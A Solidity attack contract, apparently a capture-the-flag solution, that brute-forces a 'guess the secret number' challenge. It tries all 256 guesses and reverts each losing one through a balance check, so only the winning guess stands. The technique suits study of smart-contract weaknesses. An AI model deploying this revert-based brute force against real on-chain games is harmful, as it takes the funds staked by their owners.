// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

//PRN games can be guessed by checking and revert if not won.

interface IGuessTheSecretNumberChallenge {
    function guess(uint8 n) external payable;
}

contract Solution6 {
    IGuessTheSecretNumberChallenge public victim;

    constructor(IGuessTheSecretNumberChallenge victim_) {
        victim = victim_;
    }

    function attack() external payable {
        for (uint8 n = 0; n <= type(uint8).max; n++) {
            try this.tryGuess{value:1 ether}(n) {
                return;
            } catch {

            }
        }
    }

    function tryGuess(uint8 n) external payable {
        victim.guess{value:1 ether}(n);
        require(address(this).balance == 2 ether);
    }

    //We need this to be able to handle payable(owner).transfer(address(this).balance);
    receive() external payable {
    }
}
